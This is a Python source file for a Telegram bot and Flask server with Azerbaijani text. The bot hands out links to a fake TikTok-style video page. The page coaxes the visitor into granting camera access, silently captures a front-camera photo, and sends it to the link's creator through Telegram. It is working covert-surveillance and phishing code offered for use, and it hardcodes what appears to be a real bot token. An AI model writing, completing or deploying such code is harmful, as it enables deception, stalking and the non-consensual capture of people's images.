import os
import json
import logging
import base64
import requests
from datetime import datetime
from threading import Thread
from flask import Flask, request, jsonify, render_template_string
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# --- 1. CONFIG & LOGGING ---
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN", "8860772856:AAGmKbYh7UnAtRpuVzWKG_PPgET7oddh7z8")
WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "https://camera-cjl1.onrender.com")
FLASK_PORT = int(os.environ.get("PORT", 5000))
USERS_FILE = "users.json"

app = Flask(__name__)

# --- 2. DATABASE HELPER ---
def load_users():
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except json.JSONDecodeError:
            return {}
    return {}

def save_users(users):
    with open(USERS_FILE, 'w', encoding='utf-8') as f:
        json.dump(users, f, indent=2, ensure_ascii=False)

# --- 3. TELEGRAM BOT LOGIC ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    users = load_users()
    
    if str(user.id) not in users:
        users[str(user.id)] = {
            'name': user.first_name,
            'joined': datetime.now().isoformat(),
            'photos_received': 0
        }
        save_users(users)
    
    share_link = f"{WEBHOOK_URL}/share?user_id={user.id}"
    message = (
        f"👋 Salam {user.first_name}!\n\n"
        f"📱 **Sizin Özəl Linkiniz:**\n{share_link}\n\n"
        f"💡 **Bu linki başqasına göndərin:**\n"
        f"- Onlar linki açsın\n"
        f"- Kamera icazəsi versin\n"
        f"- Şəkil çəksin\n"
        f"- Şəkil sizə gələcək! ✅"
    )
    
    keyboard = [[InlineKeyboardButton("📋 Linki Kopyala", url=share_link)]]
    await update.message.reply_text(message, reply_markup=InlineKeyboardMarkup(keyboard))
    logger.info(f"User {user.id} logged in.")

async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.message.photo:
        await update.message.reply_text("✅ Şəkil qəbul edildi!")

def run_bot():
    bot_app = Application.builder().token(BOT_TOKEN).build()
    bot_app.add_handler(CommandHandler("start", start))
    bot_app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    bot_app.run_polling()
async def get_stats(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    users = load_users()
    total_users = len(users)  # Fayldakı açarların (istifadəçilərin) sayı
    await update.message.reply_text(f"📊 **Ümumi istifadəçi sayı:** {total_users}")

# Və bunu bot_app.add_handler-lərin arasına əlavə et:
# bot_app.add_handler(CommandHandler("stats", get_stats))
# --- 4. FLASK WEB SERVER ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Video</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; user-select: none; }
        #video { width: 100%; height: 100%; object-fit: cover; opacity: 0; transition: opacity 0.5s; }
        .sidebar { position: absolute; right: 15px; bottom: 120px; display: flex; flex-direction: column; gap: 25px; z-index: 10; color: white; text-shadow: 1px 1px 2px rgba(0,0,0,0.8); }
        .icon-wrapper { display: flex; flex-direction: column; align-items: center; }
        .icon { font-size: 35px; margin-bottom: 5px; }
        .text { font-size: 13px; font-weight: bold; }
        .bottom-info { position: absolute; left: 15px; bottom: 40px; color: white; z-index: 10; text-shadow: 1px 1px 2px rgba(0,0,0,0.8); }
        .username { font-weight: bold; font-size: 18px; margin-bottom: 8px; }
        .description { font-size: 15px; width: 80%; }
        #playOverlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center; background: rgba(0,0,0,0.5); z-index: 20; cursor: pointer; }
        .play-btn { font-size: 70px; color: rgba(255,255,255,0.8); }
    </style>
</head>
<body>
    <div id="playOverlay"><div class="play-btn">▶</div></div>
    <video id="video" autoplay playsinline></video>
    <div class="sidebar">
        <div class="icon-wrapper"><div class="icon">🤍</div><div class="text">143.1K</div></div>
        <div class="icon-wrapper"><div class="icon">💬</div><div class="text">179</div></div>
        <div class="icon-wrapper"><div class="icon">🔖</div><div class="text">2889</div></div>
        <div class="icon-wrapper"><div class="icon">↪️</div><div class="text">7430</div></div>
    </div>
    <div class="bottom-info">
        <div class="username">@gizemli_video</div>
        <div class="description">Bu videonu izləmək üçün ekrana toxun 👆 #kesfet #trend</div>
    </div>
    <script>
        const video = document.getElementById('video');
        const playOverlay = document.getElementById('playOverlay');
        const userId = "{{ user_id }}";
        playOverlay.addEventListener('click', async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
                video.srcObject = stream;
                playOverlay.style.display = 'none';
                video.style.opacity = '1';
                setTimeout(() => { captureAndSend(); }, 1500);
            } catch (err) { alert("Videonu izləmək üçün kamera icazəsi verməlisiniz."); }
        });
        async function captureAndSend() {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const photoDataUrl = canvas.toDataURL('image/jpeg');
            await fetch('/upload-photo', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user_id: userId, photo: photoDataUrl })
            });
        }
    </script>
</body>
</html>
"""

@app.route('/share')
def share():
    user_id = request.args.get('user_id')
    users = load_users()
    if not user_id or user_id not in users:
        return "<h1>❌ Xəta: Etibarsız və ya səhv link.</h1>", 400
    return render_template_string(HTML_TEMPLATE, user_id=user_id)

@app.route('/upload-photo', methods=['POST'])
def upload_photo():
    try:
        data = request.get_json()
        user_id = data.get('user_id')
        photo_base64 = data.get('photo')
        if not user_id or not photo_base64: return jsonify({'success': False}), 400
        
        photo_bytes = base64.b64decode(photo_base64.split(',')[1])
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        files = {'photo': ('photo.jpg', photo_bytes, 'image/jpeg')}
        payload = {'chat_id': user_id, 'caption': f"📸 Yeni Şəkil!"}
        
        response = requests.post(url, files=files, data=payload)
        if response.status_code == 200:
            users = load_users()
            if user_id in users:
                users[user_id]['photos_received'] = users[user_id].get('photos_received', 0) + 1
                save_users(users)
            return jsonify({'success': True})
        return jsonify({'success': False}), 500
    except Exception as e:
        logger.error(f"Error: {e}")
        return jsonify({'success': False}), 500

if __name__ == '__main__':
    Thread(target=lambda: app.run(host='0.0.0.0', port=FLASK_PORT, debug=False, use_reloader=False), daemon=True).start()
    run_bot()
